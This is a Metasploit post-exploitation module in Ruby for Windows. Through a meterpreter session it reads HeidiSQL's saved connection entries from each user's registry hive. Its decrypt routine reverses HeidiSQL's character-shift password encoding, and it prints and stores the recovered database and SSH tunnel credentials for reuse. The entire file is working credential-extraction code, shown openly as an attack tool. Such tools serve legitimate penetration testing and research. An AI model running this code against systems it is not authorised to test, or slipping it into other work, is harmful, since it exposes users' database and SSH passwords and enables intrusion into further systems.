##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather HeidiSQL Saved Password Extraction',
      'Description'   => %q{
        This module extracts saved passwords from the HeidiSQL client. These
      passwords are stored in the registry. They are encrypted with a custom algorithm.
      This module extracts and decrypts these passwords.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['h0ng10'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def print_error(msg='')
    super("#{peer} - #{msg}")
  end

  def print_good(msg='')
    super("#{peer} - #{msg}")
  end

  def run
    userhives=load_missing_hives()
      userhives.each do |hive|
        next if hive['HKU'].nil?
        print_status("Looking at Key #{hive['HKU']}")
        begin
          subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\HeidiSQL\\Servers")
          if subkeys.blank?
            print_status("HeidiSQL not installed for this user.")
            next
          end

          service_types = { 0 => 'mysql',
                            1 => 'mysql-named-pipe',
                            2 => 'mysql-ssh',
                            3 => 'mssql-named-pipe',
                            4 => 'mssql',
                            5 => 'mssql-spx-ipx',
                            6 => 'mssql-banyan-vines',
                            7 => 'mssql-windows-rpc',
                            8 => 'postgres'}

          subkeys.each do |site|
            site_key = "#{hive['HKU']}\\Software\\HeidiSQL\\Servers\\#{site}"
            host     = registry_getvaldata(site_key, "Host") || ""
            user     = registry_getvaldata(site_key, "User") || ""
            port     = registry_getvaldata(site_key, "Port") || ""
            db_type  = registry_getvaldata(site_key, "NetType") || ""
            prompt   = registry_getvaldata(site_key, "LoginPrompt") || ""
            ssh_user = registry_getvaldata(site_key, "SSHtunnelUser") || ""
            ssh_host = registry_getvaldata(site_key, "SSHtunnelHost") || ""
            ssh_port = registry_getvaldata(site_key, "SSHtunnelPort") || ""
            ssh_pass = registry_getvaldata(site_key, "SSHtunnelPass") || ""
            win_auth = registry_getvaldata(site_key, "WindowsAuth") || ""
            epass = registry_getvaldata(site_key, "Password")

            # skip if windows authentication is used (mssql only)
            next if db_type.between?(3,7) and win_auth == 1
            next if epass == nil or epass == "" or epass.length == 1 or prompt == 1
            pass = decrypt(epass)
            print_good("Service: #{service_types[db_type]} Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")

          service_data = {
            address: host == '127.0.0.1' ? rhost : host,
            port: port,
            service_name: service_types[db_type],
            protocol: 'tcp',
            workspace_id: myworkspace_id
          }

          credential_data = {
              origin_type: :session,
              session_id: session_db_id,
              post_reference_name: self.refname,
              private_type: :password,
              private_data: pass,
              username: user
          }

          credential_data.merge!(service_data)


          # Create the Metasploit::Credential::Core object
          credential_core = create_credential(credential_data)

          # Assemble the options hash for creating the Metasploit::Credential::Login object
          login_data ={
              core: credential_core,
              status: Metasploit::Model::Login::Status::UNTRIED
          }

          # Merge in the service data and create our Login
          login_data.merge!(service_data)
          login = create_credential_login(login_data)


          # if we have a MySQL via SSH connection, we need to store the SSH credentials as well
          if db_type == 2 then

            print_good("Service: ssh Host: #{ssh_host} Port: #{ssh_port} User: #{ssh_user}  Password: #{ssh_pass}")

            service_data = {
              address: ssh_host,
              port: ssh_port,
              service_name: 'ssh',
              protocol: 'tcp',
              workspace_id: myworkspace_id
            }

            credential_data = {
                origin_type: :session,
                session_id: session_db_id,
                post_reference_name: self.refname,
                private_type: :password,
                private_data: ssh_pass,
                username: ssh_user
            }

            credential_data.merge!(service_data)

            # Create the Metasploit::Credential::Core object
            credential_core = create_credential(credential_data)

            # Assemble the options hash for creating the Metasploit::Credential::Login object
            login_data ={
                core: credential_core,
                status: Metasploit::Model::Login::Status::UNTRIED
            }

            # Merge in the service data and create our Login
            login_data.merge!(service_data)
            login = create_credential_login(login_data)

          end
        end
      rescue ::Rex::Post::Meterpreter::RequestError => e
        elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
        print_error("Cannot Access User SID: #{hive['HKU']} : #{e.message}")
      end
    end
    unload_our_hives(userhives)
  end

  def decrypt(encoded)
    decoded = ""
    shift = Integer(encoded[-1,1])
    encoded = encoded[0,encoded.length-1]

    hex_chars = encoded.scan(/../)
    hex_chars.each do |entry|
      x = entry.to_i(16) - shift
      decoded += x.chr(Encoding::UTF_8)
    end

    return decoded
  end
end
